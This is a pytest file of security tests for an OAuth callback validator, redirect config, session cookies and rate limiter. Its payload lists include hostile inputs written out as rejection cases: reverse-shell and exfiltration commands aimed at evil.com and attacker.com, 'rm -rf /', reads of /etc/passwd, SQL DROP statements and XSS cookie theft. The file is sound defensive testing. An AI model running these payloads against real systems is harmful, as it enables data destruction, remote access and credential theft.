"""Security-focused tests for authentication components."""

import threading
import time
from unittest.mock import Mock, patch

import pytest

from requirements_bot.api.error_responses import ValidationError
from requirements_bot.api.rate_limiting import RateLimiter
from requirements_bot.core.services.oauth_callback_validator import OAuthCallbackValidator
from requirements_bot.core.services.oauth_redirect_config import OAuthRedirectConfig
from requirements_bot.core.services.session_cookie_config import SessionCookieConfig


class TestSecurityVulnerabilities:
    """Test protection against common security vulnerabilities."""

    def test_xss_prevention_in_oauth_parameters(self):
        """Test XSS prevention in OAuth parameters."""
        validator = OAuthCallbackValidator()

        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'\"><script>alert(document.cookie)</script>",
            "<svg onload=alert('xss')>",
            "javascript://comment%0Aalert('xss')",
            "<iframe src=javascript:alert('xss')></iframe>",
            "eval('alert(\"xss\")')",
            "Expression(alert('xss'))",
            "<body onload=alert('xss')>",
        ]

        for payload in xss_payloads:
            # All XSS payloads should be rejected
            with pytest.raises(ValidationError):
                validator._validate_code_param(payload, "google")

            with pytest.raises(ValidationError):
                validator._validate_state_param(payload + "1234567890", "google")

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention."""
        validator = OAuthCallbackValidator()

        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR 1=1 --",
            "admin'/*",
            "' UNION SELECT password FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' AND 1=2 UNION SELECT * FROM users --",
            "'; DELETE FROM users WHERE '1'='1",
            "' OR 'a'='a",
            "1' OR '1'='1' --",
            "'; SHUTDOWN; --",
        ]

        for payload in sql_injection_payloads:
            with pytest.raises(ValidationError):
                validator._validate_code_param(payload, "google")

    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        validator = OAuthCallbackValidator()

        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(wget http://evil.com/shell.sh)",
            "`id`",
            "; nc -e /bin/sh attacker.com 4444",
            '| powershell -command "invoke-webrequest evil.com"',
            "; curl evil.com/steal?data=$(cat /etc/passwd)",
            "$(curl -X POST -d @/etc/passwd evil.com)",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "| bash -c 'echo vulnerable'",
        ]

        for payload in command_injection_payloads:
            with pytest.raises(ValidationError):
                validator._validate_code_param(payload, "google")

    def test_path_traversal_prevention(self):
        """Test path traversal prevention."""
        validator = OAuthCallbackValidator()

        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "/var/www/../../etc/passwd",
            "....\\....\\....\\etc\\passwd",
            "%252e%252e%252fetc%252fpasswd",
            "../../../windows/win.ini",
        ]

        for payload in path_traversal_payloads:
            with pytest.raises(ValidationError):
                validator._validate_code_param(payload, "google")

    def test_open_redirect_prevention(self):
        """Test open redirect prevention."""
        config = OAuthRedirectConfig()

        malicious_redirect_uris = [
            "https://evil.com/callback",
            "http://phishing.net/steal-tokens",
            "https://trusted.com.evil.com/callback",  # Subdomain confusion
            "https://evil.com@trusted.com/callback",  # User info
            "https://trusted.com/callback@evil.com",  # Fragment confusion
            "javascript://trusted.com/callback",  # Protocol confusion
            "data:text/html,<script>steal_tokens()</script>",
            "ftp://evil.com/callback",
            "file:///etc/passwd",
            "https://192.168.1.1/callback",  # IP address (if not whitelisted)
        ]

        # Configure with a specific trusted domain
        with patch.dict("os.environ", {"OAUTH_ALLOWED_DOMAINS": "trusted.com"}):
            config = OAuthRedirectConfig()

            for uri in malicious_redirect_uris:
                assert config.validate_redirect_uri(uri) is False, f"Should reject: {uri}"

    def test_csrf_protection_state_validation(self):
        """Test CSRF protection through state parameter validation."""
        validator = OAuthCallbackValidator()

        # Test state parameter requirements
        csrf_attack_states = [
            "",  # Empty state
            "short",  # Too short
            "predictable123",  # Predictable state
            "a" * 200,  # Too long state
            "state with spaces",  # Invalid characters
            "state@evil.com",  # Email-like state
        ]

        for state in csrf_attack_states:
            with pytest.raises(ValidationError):
                validator._validate_state_param(state, "google")

    def test_session_fixation_prevention(self):
        """Test session fixation prevention through secure cookie settings."""
        with patch.dict("os.environ", {"ENVIRONMENT": "production"}):
            config = SessionCookieConfig()
            settings = config.get_cookie_settings()

            # Secure cookie settings prevent session fixation
            assert settings["secure"] is True  # HTTPS only
            assert settings["httponly"] is True  # No JS access
            assert settings["samesite"] == "lax"  # CSRF protection
            assert settings["path"] == "/"  # Proper scoping

    def test_clickjacking_prevention(self):
        """Test clickjacking prevention through security headers."""
        config = SessionCookieConfig()
        headers = config.get_response_headers()

        # Anti-clickjacking headers
        assert headers["X-Frame-Options"] == "DENY"
        assert headers["X-Content-Type-Options"] == "nosniff"

    def test_mime_sniffing_prevention(self):
        """Test MIME sniffing prevention."""
        config = SessionCookieConfig()
        headers = config.get_response_headers()

        assert headers["X-Content-Type-Options"] == "nosniff"

    def test_xss_protection_header(self):
        """Test XSS protection header."""
        config = SessionCookieConfig()
        headers = config.get_response_headers()

        assert headers["X-XSS-Protection"] == "1; mode=block"

    def test_transport_security_enforcement(self):
        """Test HTTP Strict Transport Security enforcement."""
        with patch.dict("os.environ", {"ENVIRONMENT": "production"}):
            config = SessionCookieConfig()
            headers = config.get_response_headers()

            # HSTS header should be present in production
            assert "Strict-Transport-Security" in headers
            hsts_value = headers["Strict-Transport-Security"]
            assert "max-age=31536000" in hsts_value  # 1 year
            assert "includeSubDomains" in hsts_value

    def test_rate_limiting_dos_protection(self):
        """Test rate limiting protects against DoS attacks."""
        limiter = RateLimiter(max_requests=3, window_seconds=60)

        # Simulate rapid requests from same IP
        for _i in range(3):
            allowed, _ = limiter.is_allowed("attacker_ip")
            assert allowed is True

        # 4th request should be blocked
        allowed, _ = limiter.is_allowed("attacker_ip")
        assert allowed is False

        # Different IP should still work
        allowed, _ = limiter.is_allowed("legitimate_ip")
        assert allowed is True

    def test_distributed_dos_protection(self):
        """Test protection against distributed DoS attacks."""
        limiter = RateLimiter(max_requests=1, window_seconds=60)

        # Test that each IP gets its own limit (not global limit)
        unique_ips = [f"192.168.1.{i}" for i in range(10)]

        # Each unique IP should get 1 allowed request
        for ip in unique_ips:
            allowed, _ = limiter.is_allowed(ip)
            assert allowed is True, f"First request from {ip} should be allowed"

        # Second requests from same IPs should be blocked
        blocked_count = 0
        for ip in unique_ips:
            allowed, _ = limiter.is_allowed(ip)
            if not allowed:
                blocked_count += 1

        # All second requests should be blocked (per-IP rate limiting)
        assert blocked_count == len(unique_ips), "All second requests should be blocked per IP"

    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks."""
        validator = OAuthCallbackValidator()

        # Test different validation scenarios
        test_cases = [
            ("valid_code_123", "valid_state_1234567890"),
            ("", "valid_state_1234567890"),  # Missing code
            ("valid_code_123", ""),  # Missing state
            ("invalid<code>", "valid_state_1234567890"),  # Invalid code
        ]

        timings = []
        for code, state in test_cases:
            start_time = time.time()
            try:
                validator._validate_code_param(code, "google") if code else None
                validator._validate_state_param(state, "google") if state else None
            except Exception:
                pass  # Expected for invalid inputs
            end_time = time.time()
            timings.append(end_time - start_time)

        # Timing differences should not be excessive
        if len(timings) > 1:
            max_timing = max(timings)
            min_timing = min(timings)
            if min_timing > 0:
                timing_ratio = max_timing / min_timing
                assert timing_ratio < 100  # Allow some variance but not excessive

    def test_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion attacks."""
        limiter = RateLimiter(max_requests=1, window_seconds=1)

        # Try to create many unique identifiers
        for i in range(1000):
            limiter.is_allowed(f"attacker_{i}")

        # Memory usage should be manageable
        assert len(limiter.requests) == 1000

        # Cleanup should work
        time.sleep(1.1)
        limiter.cleanup_expired()
        assert len(limiter.requests) == 0

    def test_unicode_normalization_attacks(self):
        """Test protection against Unicode normalization attacks."""
        validator = OAuthCallbackValidator()

        unicode_attacks = [
            "code\u202e\u0041\u0041\u0041",  # Right-to-left override
            "code\ufeff",  # Byte order mark
            "code\u00a0",  # Non-breaking space
            "code\u2028",  # Line separator
            "code\u2029",  # Paragraph separator
            "code\u0085",  # Next line
            "code\u000b",  # Vertical tab
            "code\u000c",  # Form feed
        ]

        for attack in unicode_attacks:
            with pytest.raises(ValidationError):
                validator._validate_code_param(attack, "google")

    def test_null_byte_injection_prevention(self):
        """Test null byte injection prevention."""
        validator = OAuthCallbackValidator()

        null_byte_attacks = [
            "code\x00admin",
            "\x00code",
            "code\x00\x00",
            "valid_code\x00.evil",
        ]

        for attack in null_byte_attacks:
            with pytest.raises(ValidationError):
                validator._validate_code_param(attack, "google")

    def test_http_header_injection_prevention(self):
        """Test HTTP header injection prevention."""
        config = OAuthRedirectConfig()

        # Test malicious headers in proxy headers
        request = Mock()
        request.url.scheme = "http"
        request.url.netloc = "internal.server"
        request.headers = {
            "host": "internal.server",
            "X-Forwarded-Proto": "https\r\nInjected-Header: malicious",
            "X-Forwarded-Host": "evil.com\r\nAnother-Header: attack",
        }

        # Should handle malicious headers without injection
        try:
            base_url = config._get_base_url(request)
            # Should not contain CRLF injection
            assert "\r" not in base_url
            assert "\n" not in base_url
        except Exception:
            # Acceptable to reject malformed headers
            pass


class TestConcurrencySecurityIssues:
    """Test security issues that can arise from concurrent access."""

    def test_race_condition_rate_limiting(self):
        """Test race conditions in rate limiting."""
        limiter = RateLimiter(max_requests=1, window_seconds=60)
        results = []
        errors = []

        def make_request():
            try:
                allowed, _ = limiter.is_allowed("race_condition_user")
                results.append(allowed)
            except Exception as e:
                errors.append(e)

        # Create multiple threads racing for the single allowed request
        threads = [threading.Thread(target=make_request) for _ in range(10)]

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        # Should not have errors
        assert len(errors) == 0

        # Should have exactly 1 allowed request
        allowed_count = sum(1 for result in results if result)
        assert allowed_count == 1

    def test_state_validation_thread_safety(self):
        """Test state validation thread safety."""
        validator = OAuthCallbackValidator()
        results = []
        errors = []

        def validate_params():
            try:
                # Each thread validates different but valid parameters
                thread_id = threading.current_thread().ident
                code = f"code_{thread_id}"
                state = f"state_{thread_id}_123456"
                validator._validate_code_param(code, "google")
                validator._validate_state_param(state, "google")
                results.append(True)
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=validate_params) for _ in range(5)]

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        # Should not have any errors
        assert len(errors) == 0
        assert len(results) == 5

    def test_configuration_loading_thread_safety(self):
        """Test configuration loading thread safety."""
        results = []
        errors = []

        def load_config():
            try:
                with patch.dict("os.environ", {"ENVIRONMENT": "production"}):
                    config = SessionCookieConfig()
                    settings = config.get_cookie_settings()
                    results.append(settings)
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=load_config) for _ in range(10)]

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        # Should not have errors
        assert len(errors) == 0
        assert len(results) == 10

        # All results should be identical
        first_result = results[0]
        for result in results[1:]:
            assert result == first_result


class TestInputValidationSecurityEdgeCases:
    """Test edge cases in input validation that could lead to security issues."""

    def test_very_long_input_handling(self):
        """Test handling of extremely long inputs."""
        validator = OAuthCallbackValidator()

        # Test with inputs that could cause buffer overflows or DoS
        very_long_code = "a" * 100000
        very_long_state = "b" * 100000

        # Should handle gracefully
        try:
            validator._validate_code_param(very_long_code, "google")
            raise AssertionError("Should have rejected very long code")
        except Exception as e:
            # Should be a validation error, not a crash
            assert "too long" in str(e).lower() or "length" in str(e).lower()

        try:
            validator._validate_state_param(very_long_state, "google")
            raise AssertionError("Should have rejected very long state")
        except Exception as e:
            assert "too long" in str(e).lower() or "length" in str(e).lower()

    def test_empty_string_edge_cases(self):
        """Test empty string handling edge cases."""
        validator = OAuthCallbackValidator()

        empty_variations = ["", None, "   ", "\t", "\n", "\r\n"]

        for empty in empty_variations:
            if empty is not None:
                with pytest.raises(ValidationError):
                    validator._validate_code_param(empty, "google")
                with pytest.raises(ValidationError):
                    validator._validate_state_param(empty, "google")

    def test_special_character_combinations(self):
        """Test special character combinations that could bypass validation."""
        validator = OAuthCallbackValidator()

        special_combinations = [
            "code%00admin",  # URL-encoded null
            "code%0ainjection",  # URL-encoded newline
            "code%0dinjection",  # URL-encoded carriage return
            "code%20space",  # URL-encoded space
            "code%3cscript%3e",  # URL-encoded script tags
            "code\u0000admin",  # Unicode null
            "code\u000aadmin",  # Unicode line feed
            "code\u000dadmin",  # Unicode carriage return
        ]

        for combo in special_combinations:
            with pytest.raises(ValidationError):
                validator._validate_code_param(combo, "google")

    def test_boundary_value_analysis(self):
        """Test boundary values for length validation."""
        validator = OAuthCallbackValidator()

        # Test exact boundary values
        max_code_length = validator.max_code_length
        max_state_length = validator.max_state_length
        min_state_length = 10

        # Code at exact max length should be valid (if format is valid)
        code_at_max = "a" * max_code_length
        try:
            validator._validate_code_param(code_at_max, "google")
        except Exception as e:
            # If it fails, should be due to format, not length
            assert "format" in str(e).lower()

        # Code over max length should fail
        code_over_max = "a" * (max_code_length + 1)
        with pytest.raises(Exception) as exc_info:
            validator._validate_code_param(code_over_max, "google")
        assert "too long" in str(exc_info.value).lower()

        # State at exact boundaries
        state_at_min = "a" * min_state_length
        validator._validate_state_param(state_at_min, "google")  # Should pass

        state_under_min = "a" * (min_state_length - 1)
        with pytest.raises(ValidationError):
            validator._validate_state_param(state_under_min, "google")

        state_at_max = "a" * max_state_length
        validator._validate_state_param(state_at_max, "google")  # Should pass

        state_over_max = "a" * (max_state_length + 1)
        with pytest.raises(Exception) as exc_info:
            validator._validate_state_param(state_over_max, "google")
        assert "too long" in str(exc_info.value).lower()

    def test_regex_catastrophic_backtracking(self):
        """Test protection against regex catastrophic backtracking."""
        validator = OAuthCallbackValidator()

        # Patterns that could cause catastrophic backtracking
        backtrack_patterns = [
            "a" * 1000 + "!",  # Long string ending with invalid character
            "a" * 500 + "b" * 500 + "!",
            ("a" * 100 + "b") * 10 + "!",
            "x" * 1000 + "y" * 1000 + "!",
        ]

        for pattern in backtrack_patterns:
            start_time = time.time()
            try:
                validator._validate_code_param(pattern, "google")
            except Exception:
                pass  # Expected to fail validation
            end_time = time.time()

            # Should not take excessive time (protection against ReDoS)
            execution_time = end_time - start_time
            assert execution_time < 1.0, f"Regex took too long: {execution_time}s for pattern length {len(pattern)}"
